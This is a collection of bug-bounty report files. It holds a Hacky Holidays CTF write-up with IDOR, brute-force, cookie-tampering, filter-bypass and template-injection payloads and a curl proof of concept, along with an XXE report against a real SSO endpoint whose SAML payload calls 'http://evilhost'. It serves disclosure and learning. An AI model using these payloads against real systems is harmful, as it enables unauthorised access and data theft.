1https://hackyholidays.h1ctf.com/attack-box/launch/?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9Cg==
After several attempts trying to get things to resolve in the desired order:
<image_33>
...and...
<image_34>
Mission accomplished! I have successfully pinged (pung?) the Grinch Networks servers to death!
Flag: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Thanks!
Thanks very much to those who put the challenge together, I had a great time and learned a few new tricks! Also, I hate you just a little bit for flag 11. <3.
Impact
Hopefully a $500 bounty ;)



==================================================

Report File: 106865.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Command Injection - Generic

Contents:

Request:
POST /sso HTTP/1.1
Host: rev-app.informatica.com
Connection: keep-alive
Content-Length: 8669
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://infapassport.okta.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: https://infapassport.okta.com/app/template_saml/kwtbgh4jLAZPMXLQUNMU/sso/saml
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgJSBhc2QgU1lTVEVNICJodHRwOi8vZXZpbGhvc3QiPiAlYXNkO10%2BPHNhbWwycDpSZXNwb25zZSB4bWxuczpzYW1sMnA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCIgRGVzdGluYXRpb249Imh0dHBzOi8vcmV2LWFwcC5pbmZvcm1hdGljYS5jb20vc3NvIiBJRD0iaWQyOTA5ODg2NzYyNzM5OTM1NDEyMDk2MjY1NSIgSXNzdWVJbnN0YW50PSIyMDE1LTEyLTI1VDEyOjQ4OjMwLjY3MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSI%2BaHR0cDovL3d3dy5va3RhLmNvbS9rd3RiZ2g0akxBWlBNWExRVU5NVTwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQyOTA5ODg2NzYyNzM5OTM1NDEyMDk2MjY1NSI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI%2BPGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPm9aV0EzYUVwRTdXeXhUUjdiRFllNDFieGVXaz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BZ0hwc0Z1aURmSE9ZOTkzY0IrVkRvdlQxNDg3T1U1Y1ZmTmxldlN3VXFiK3I5UTJGR00xWDFFczJNT2x1MXBudXQzU3V4dGNzcXU3OWdqb0ZvVW9RdGFnNllFNjhEdGtwR1d5S2RYUW1sZU9ZM0lkQ21NcGk4cFhXdnZJTnV2WDBiZHp6V1ZXTVlqTXplbDdPTFBXL0FZMDdETGl5ellkT0dYTmtKemlZcVZRPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQ296Q0NBZ3lnQXdJQkFnSUdBVDN3UmxIdE1BMEdDU3FHU0liM0RRRUJCUVVBTUlHVU1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhGVEFUQmdOVkJBTU1ER2x1Wm1Gd1lYTnpjRzl5ZERFY01Cb0dDU3FHU0liM0RRRUoKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTBNRGt4T1RJNE16TmFGdzAwTXpBME1Ea3hPVEk1TXpOYU1JR1VNUXN3Q1FZRApWUVFHRXdKVlV6RVRNQkVHQTFVRUNBd0tRMkZzYVdadmNtNXBZVEVXTUJRR0ExVUVCd3dOVTJGdUlFWnlZVzVqYVhOamJ6RU5NQXNHCkExVUVDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RlRBVEJnTlZCQU1NREdsdVptRndZWE56Y0c5eWRERWMKTUJvR0NTcUdTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQQprOFUyUnY1S2lmMzE2aVFkRWVaU25JY3d4amNNRDkzcUpRL1BQbkJDc1A4MDFkbThEOGxxbHBmcHg0Mk82SkxwR0pycSt6UExhZURiCmo1TFJqak9GQjFWR3Z4dEM2eGlpY3o2SXZTS1FVQXFxOCtpL2hsU293SU5zdS9TOWswd0hDaEplVi9tYnBMbVRWeXRRSlYrdVNRM1QKemdjcTNWQzU5VXR2djNFNUJ4OENBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBKzBITi9sSkduTWd4SWVwVGJ4LzZqYjNhWQpPNWpyK3IraWFvL1BwL1dlNkxTL2t5MkovdkpGSnZ5TjNMcjBKcFVaeW4zQUZUc3Y4ZFNURmxjeTN2blZBUjdkdnhaY1dHTGlwbzRECm5ZQ3NGNmYvcFgwRDFHSmgyaUZxL3ArK0dqbldIRzZ0Z3ZkUm93akdqVkM3MTFrTy9rUHJIa1ZleDFTNGhlUkxCUVM2Mnc9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sMnA6U3RhdHVzIHhtbG5zOnNhbWwycD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48c2FtbDJwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbDJwOlN0YXR1cz48c2FtbDI6QXNzZXJ0aW9uIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iaWQyOTA5ODg2NzYyNzQ3NjQxMzUwNDEzNDk3MiIgSXNzdWVJbnN0YW50PSIyMDE1LTEyLTI1VDEyOjQ4OjMwLjY3MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BaHR0cDovL3d3dy5va3RhLmNvbS9rd3RiZ2g0akxBWlBNWExRVU5NVTwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQyOTA5ODg2NzYyNzQ3NjQxMzUwNDEzNDk3MiI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI%2BPGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPnYzMDhxcFZNZ3k0cTNIVk5BMmgyTmxzREE0OD08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BUE5HMUllTXI2MGlkSUkvNFIrcWhSNXFzVUZVM05NYkRzOUFtTzdIZ0U2UFprMFg0VnJlbHJPTjRZeXkwdzY0dUhnQjUvQUpyRTREZ1YyOVV1Vi9NSmg4ZVByK1pRUlpRR09nZFphZTljcGM5VHBYZVRsWVF1T2dleVcyM25HZDRLeHBtK0ZkVU1aaldTY0pYditrYjQrQ2Q5eElmKzRCTDE5MnJ5elBEc1cwPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQ296Q0NBZ3lnQXdJQkFnSUdBVDN3UmxIdE1BMEdDU3FHU0liM0RRRUJCUVVBTUlHVU1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhGVEFUQmdOVkJBTU1ER2x1Wm1Gd1lYTnpjRzl5ZERFY01Cb0dDU3FHU0liM0RRRUoKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTBNRGt4T1RJNE16TmFGdzAwTXpBME1Ea3hPVEk1TXpOYU1JR1VNUXN3Q1FZRApWUVFHRXdKVlV6RVRNQkVHQTFVRUNBd0tRMkZzYVdadmNtNXBZVEVXTUJRR0ExVUVCd3dOVTJGdUlFWnlZVzVqYVhOamJ6RU5NQXNHCkExVUVDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RlRBVEJnTlZCQU1NREdsdVptRndZWE56Y0c5eWRERWMKTUJvR0NTcUdTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQQprOFUyUnY1S2lmMzE2aVFkRWVaU25JY3d4amNNRDkzcUpRL1BQbkJDc1A4MDFkbThEOGxxbHBmcHg0Mk82SkxwR0pycSt6UExhZURiCmo1TFJqak9GQjFWR3Z4dEM2eGlpY3o2SXZTS1FVQXFxOCtpL2hsU293SU5zdS9TOWswd0hDaEplVi9tYnBMbVRWeXRRSlYrdVNRM1QKemdjcTNWQzU5VXR2djNFNUJ4OENBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBKzBITi9sSkduTWd4SWVwVGJ4LzZqYjNhWQpPNWpyK3IraWFvL1BwL1dlNkxTL2t5MkovdkpGSnZ5TjNMcjBKcFVaeW4zQUZUc3Y4ZFNURmxjeTN2blZBUjdkdnhaY1dHTGlwbzRECm5ZQ3NGNmYvcFgwRDFHSmgyaUZxL3ArK0dqbldIRzZ0Z3ZkUm93akdqVkM3MTFrTy9rUHJIa1ZleDFTNGhlUkxCUVM2Mnc9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sMjpTdWJqZWN0IHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDI6TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6MS4xOm5hbWVpZC1mb3JtYXQ6ZW1haWxBZGRyZXNzIj55YXJiYWJpbkBnbWFpbC5jb208L3NhbWwyOk5hbWVJRD48c2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxzYW1sMjpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMTUtMTItMjVUMTI6NTM6MzAuNjczWiIgUmVjaXBpZW50PSJodHRwczovL3Jldi1hcHAuaW5mb3JtYXRpY2EuY29tL3NzbyIvPjwvc2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbj48L3NhbWwyOlN1YmplY3Q%2BPHNhbWwyOkNvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDE1LTEyLTI1VDEyOjQzOjMwLjY3M1oiIE5vdE9uT3JBZnRlcj0iMjAxNS0xMi0yNVQxMjo1MzozMC42NzNaIiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPHNhbWwyOkF1ZGllbmNlPmh0dHBzOi8vcmV2LWFwcC5pbmZvcm1hdGljYS5jb20vc3NvPC9zYW1sMjpBdWRpZW5jZT48L3NhbWwyOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9zYW1sMjpDb25kaXRpb25zPjxzYW1sMjpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTUtMTItMjVUMTI6NDg6MzAuNjcyWiIgU2Vzc2lvbkluZGV4PSJpZDE0NTEwNDc3MTA2NzIuNjQ0NjAwMjU2IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF1dGhuQ29udGV4dD48c2FtbDI6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L3NhbWwyOkF1dGhuQ29udGV4dENsYXNzUmVmPjwvc2FtbDI6QXV0aG5Db250ZXh0Pjwvc2FtbDI6QXV0aG5TdGF0ZW1lbnQ%2BPHNhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudCB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF0dHJpYnV0ZSBOYW1lPSJSb2xlIiBOYW1lRm9ybWF0PSJucyI%2BPHNhbWwyOkF0dHJpYnV0ZVZhbHVlIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeHNpOnR5cGU9InhzOnN0cmluZyI%2BYWxsPC9zYW1sMjpBdHRyaWJ1dGVWYWx1ZT48L3NhbWwyOkF0dHJpYnV0ZT48L3NhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWwyOkFzc2VydGlvbj48L3NhbWwycDpSZXNwb25zZT4%3D&RelayState=
Where SAMLResponse XML in base64 with XXE payload:
<!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>



==================================================

Report File: 1068880.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

The Write-Up will be published within the next hours latest till Dec. 31st 12:00 PST under https://blogs.tippexs.io
User: h4ck4r0ne
Pass: s4nt4sucks
Let me know if I need to submit anything else. I have started crafting an PDF but it become that huge that I have decided to create a complete new blog for it.
Impact
N.A.



==================================================

Report File: 1068934.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Disclaimer: Certain things are a bit modified to set the pieces for the story. Also you can find the flags for all 12 challenges in file flags.txt (F1138300) , Now enjoy :)
Code 83 Bytes
1█▀▄▀█ █▀█ ░ █▀█ █▄▄ █▀█ █▀█ ▀█▀
2█░▀░█ █▀▄ ▄ █▀▄ █▄█ █▄█ █▄█ ░█░ saves the Christmas
Episode - 0x00 Pil0t.py
It was a gloomy clear night, Mr.R3b00t was sitting in front of the "Computer" in his Hacker Den, sound of the keyboard clicks can be heard all around and suddenly Mr.R3b00t receives a message from none other than the mighty "h1-Team".
<image_0>
The moment Mr.R3b00t read the message, He took an oath "Humanity has suffered a lot this year, I will not let The Grinch ruin Christmas too!, I will pawn him..(Thunder Rumbling in the background)"
Episode - 0x01 r0b0ts.txt
Mr.R3b00t pulled up his chair, put the black hoodie on (Hacker Mode initiated) and started hacking The Grinch, with such limited info and time the first thing that came into his genius mind was to do an Nmap scan on the target website, as his wise friend @ippsec once quoted, "Always perform an Nmap scan, you never know what surprise you will get" (ippsec never said that -_-).
Mr.R3b00t Performed an Nmap scan on https://hackyholidays.h1ctf.com but found nothing interesting except for one little thing!
<image_1>
There was a robots.txt file present on the website with one disallowed entry : /s3cr3t-ar3a (Looks like Grinch is not good at hiding things)
To have a good look at it, Mr.R3b00t opened up the robots.txt for any additional details.
<image_2>
The robots.txt file was leading to only one path /s3cr3t-ar3a, Without wasting any time Mr.R3b00t opened up the page and found the following message.
<image_3>
Grinch was going to update the website looks like he has started off his plan, Mr.R3b00t smiled and said "This is gonna be a long Christmas..".
Episode - 0x02 .hidd3n
Mr.R3b00t waited for a whole day and visited the /s3cr3t-ar3a page again, this time the page was flashing an entire new message.
<image_4>
Soon after seeing the message, Mr.R3b00t started off with the recon to find if something is hidden in the website but nothing interesting was found. Clock was ticking and Mr.R3b00t was losing all hopes of saving Christmas (more like the hope of losing a private invite).
Mr.R3b00t kept thinking and searching to find a way to know what The Grinch has been hiding but nothing worked out, a ray of hope came in when Mr.R3b00t was actually able to find the true meaning of what was written on his Desktop Wallpaper.
<image_5>
Mr.R3b00t soon contacted one of his hacker friend which was also trying to destroy Grinch's evil agenda, He told Mr.R3b00t "Not all things can be seen in the server side response, sometimes things are generated on the client's end too". It was enough for Mr.R3b00t to figure out what he was trying to say.
Mr.R3b00t quickly opened the /s3cr3t-ar3a and opened up the browser dev console, to search for any hidden secrets and voila.
<image_6>
So, It was clear that The Grinch has started off his dirty games and was going to defame a list of people on his website.
Episode - 0x03 id=1
Soon after sometime, Mr.R3b00t found the list of people deployed on Grinch's website "This dirty little thing, what is he even trying to prove with this", Mr.R3b00t said.
<image_7>
Taking a closer look Mr.R3b00t found an endpoint /people-rater/page/1 being called on initial page load.
<image_8>
The id parameters were containing base64 strings, after decoding the first value of the id attribute, Mr.R3b00t got the following result
<image_9>
Rest of the decoded "id" values were having consecutive values (3,4..), Everything was looking on place except for one single thing "Where the heck is id 1 ?"
Later on, Mr.R3b00t found if you click on respective person's name a message appears for that person and a request is made to https://hackyholidays.h1ctf.com/people-rater/entry?id={ID} the {ID} was nothing but the base64 id values fetched earlier.
For Mr.R3b00t it was a "piece of cake" to figure out what the Grinch has been hiding here, Mr.R3b00t quickly encoded the string {"id":1} as base64 and sent it along with https://hackyholidays.h1ctf.com/people-rater/entry?id={ID}
<image_10>
"What?? He is opening his swag shop now! What is he gonna sell? Snow Ball Launchers ?" Mr.R3b00t said.
Episode - 0x04 fuZZ
Looks like Grinch was selling some really lame stuff and of course on his swag-shop.
<image_11>
"Let's find out what he is hiding now", Mr.R3b00t said.
From initial recon Mr.R3b00t found out certain API endpoint which were hidden and were not present on the site.
<image_12>
The /api/sessions endpoint were throwing base64 encoded session strings.
<image_13>
Mr.R3b00t quickly decoded all the strings and found out two attributes in each string "user" and "cookie", but most of the user attributes were null except for one.
<image_14>
After spending sometime on the first endpoint it was time to move onto the second one.
An initial request to the endpoint returned the following response.
<image_15>
Looks like the endpoint was missing some params to pass along with the request, just to be sure Mr.R3b00t also checked if any other method is allowed on the endpoint but 404 is returned, only GET was allowed on the endpoint.
It was time to enum the parameters and Mr.R3b00t had the exact tool in his arsenal that could get the work done, Arjun By none other than s0md3v.
Without wasting anymore time Mr.R3b00t Fired up Arjun in his terminal and passed on the /api/user endpoint to look for the hidden params, just after few seconds he got the result. He found a valid parameter "uuid".
<image_16>
From the first endpoint Mr.R3b00t got a user with ID "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043"
At this point Mr.R3b00t exactly knew what to do next. Mr.R3b00t combined the user id with the /user?uuid= and BOOM!
<image_17>
This time Mr.R3b00t has his hands on some pretty solid information about Grinch, It was Grinch's address.
"I think its time to infiltrate the fortress..", Ep04 ends.
Episode - 0x05 Brut3f0rc3.py
Being a Master in Lock Picking it was a piece of Cake for Mr.R3b00t to get into the Grinch's house. The house was a mess and full of Dog Food, and obviously no one was there.
The only thing that caught Mr.R3b00t's attention was Grinch's Computer he quickly powered up the computer but the internal web portal was password protected (Grinch is not that big of a fool as we think he is).
<image_18>
"Hmmm, Till now he was operating from this computer", Mr.R3b00t said. Now the only way to get more info on Grinch is to hack his password.
Grinch is smart but let's see if he is smart enough to have a strong username and password. So Mr.R3b00t noticed one unusual behaviour whenever a wrong username was provided "Invalid Username" was appearing as an error, this could be the factor to bruteforce the username.
After a quick bruteforce using ffuf revealed the username as "access".
<image_19>
Now a similar behaviour was seen with the password field, whenever Mr.R3b00t entered the username as "access" and a random password "Invalid password" error popped up.
It was time to brute force the password another quick fuzz with ffuf revealed the password as "computer".
<image_20>
Now Mr.R3b00t was having credentials for the Grinch's Internal login portal he quickly logged in and soon enough he found that there is nothing inside it.(wait.. what??)
<image_21>
"He must be hiding something, it can't be empty" Mr.R3b00t said with a frown on his face.
He decided to investigate deeper and found out that the session token is a base64 string with the following JSON data.
<image_22>
Mr.R3b00t Changed admin to "true" and replayed the request and BOOM! he had access to Grinch's personal files.
<image_23>
The zip file found was also password protected but this time Mr.R3b00t exactly knew how to open it up. Mr.R3b00t transferred the file onto his own laptop, fired up Kali and cracked the ZIP file pass using "fcrackzip".
<image_24>
Unzipping the file revealed that Grinch is definitely not just interested in "destroying Christmas"(Naughty Grinch).
<image_25>
Mr.R3b00t took a peak in the diary.txt file and found out a link to his online diary.
<image_26>
"This is his personal diary, I think he might have mentioned something in it about his evil plans"..Mr.R3b00t Gathered everything he can from Grinch's house put everything back to it's place and removed every possible trace...
Episode - 0x06 secretadminsecretadmin.phpadminadmin.php.php.php
A first look at Grinch's diary was not revealing anything sensitive.
<image_27>
From initial recon Mr.R3b00t found out there are following hidden files present on the site.
<image_28>
And the page /my-diary was always redirecting to /my-diary/?template=entries.html looked like the site is including data from other pages present in the dirs.
So index.php was present on the site but it was redirecting to /my-diary/?template=entries.html If the site is including code from other files might be possible there is also a way to read the contents of index.php
Mr.R3b00t quickly changed the "entries.html" to "index.php" and sent the request to "https://hackyholidays.h1ctf.com/my-diary/?template=index.php" and soon enough he had the source code for "index.php"
<image_29>
"Hmmmm, so he changed the admin page to "secretadmin.php", but he is restricting the access to secretadmin.php".
The index.php was having three filters; preg_replace() which was filtering out non-alphanumeric character except for the character "." .
And two str_replace() filters to restrict access to admin.php and secretadmin.php, It was time to find out the perfect payload to bypass all the filters.
Mr.R3b00t tried multiple directory traversal payloads but nothing worked because everytime you will put a char "/" or string "admin.php" or "secretadmin.php" in the payload it will get filtered out...Looked like directory traversal isn't the way, it was time to play with the str_replace() function.

Trivia

Hey! its d3f4u17 let's find out some interesting facts about str_replace() function.
PHP str_replace() function replace all occurrences of the search string with the replacement string.
Example :-
Code 86 Bytes
1php > $y="hello grinch"; 
2php > $x=str_replace("grinch", "", $y);
3php > echo $x;
4hello
In the above example, str_replace() will remove all occurrences of the string "grinch" with "" in the string "hello grinch".
But still a properly crafted input can bypass the replace filter for example:- the input string "hello grincgrinchh" when passed through str_replace("grinch", "", $y); will give "hello grinch" as output. Similar technique was used to bypass the str_replace() filters for this challenge.
<image_30>

After trying some test inputs Mr.R3b00t found the ultimate payload to bypass both the str_replace() filters
Code 48 Bytes
1secretadminsecretadmin.phpadminadmin.php.php.php
When the above payload will be passed through the first filter $page = str_replace("admin.php","",$page); the resultant string would be "secretadminsecretadmin.php.php"
Now when the string "secretadminsecretadmin.php.php" will pass through the second filter the resultant string would be "secretadmin.php". Now Mr.R3b00t had the perfect payload he quickly added the payload to ?template= param and sent the request to https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadmin.phpadminadmin.php.php.php
The payload worked and The admin page loaded..
<image_31>
A draft was present on the admin dashboard and it was revealing the ultimate plan of The Grinch to ruin this year's christmas. "This is horrible! Is this what he is planning? If he succeeds Santa won't be able to distribute the presents, I have to stop him"..
Mr.R3b00t now knew what the Grinch was planning, will he be able to stop him? Will Grinch succeed in his evil agenda?? We will find out soon..
Episode - 0x07 Inj3cti0n
Few hours pass by, no strange activities were found on the Grinch Network. Ping!! A email notification came in, Mr.R3b00t checked the mail.
<image_32>
"What?? How did he get my mail?? Does he know I am after him??" Looks like Mr.R3b00t was not the only one who got the mail, Mr.R3b00t's friends also got the mail, Grinch was sending mass mail to Christmas loving People.
So if he is sending mail there has to be someplace from where he is doing it, It took Mr.R3b00t few seconds to find out the mail generating portal https://hackyholidays.h1ctf.com/mail-generator
Mr.R3b00t soon found out the template he used to Generate the mass mail.
<image_33>
The message contained a markup with placeholders {{name}} and {{template:}} which was including some kind of html file inside the body.
It's a thumb rule for Mr.R3b00t to do a dirsearch with it's in-built wordlist in the initial recon process, and it never disappoints. The dirsearch reveals a hidden directory "templates".
<image_34>
The templates folder revealed some HTML files two of them were used in the previously drafted mail.
<image_35>
The one that caught Mr.R3b00t's interest was the third one
38dhs_admins_only_header.html (The word admin always excite him)
Now, Mr.R3b00t needs to find a way to use this template.
Exploring the other features, Mr.R3b00t found out that one can also craft a mail template at https://hackyholidays.h1ctf.com/hate-mail-generator/new and can preview it at https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview
The initial request to the /preview looked as below:-
<image_36>
Mr.R3b00t quickly tried using the {{template:}} placeholder to include the file 38dhs_admins_only_header.html but it wasn't that simple
<image_37>
A permission denied error popped up.
After playing with the parameters, Mr.R3b00t found that custom params can be defined in the preview_data POST param and then can be used in preview_markup. E.g.
<image_38>
One more thing that needs to be observed was whatever input was given in the placeholder was getting reflected as it is without any filters.
<image_39>
After trying few payloads, Mr.R3b00t said "If everything is getting reflected why not pass the template placeholder itself in the custom placeholder".
Mr.R3b00t tried the payload {"test":"{{template:38dhs_admins_only_header.html}}"} and it worked like a charm.
Final PoC:-
Code 262 Bytes
1curl -X POST -sk -H "Content-Type: application/x-www-form-urlencoded" -d 'preview_markup=Hello+{{test}}+&preview_data={"test":"{{template:38dhs_admins_only_header.html}}"}' https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview | grep -Eoi "flag{[^>]+}"
<image_40>
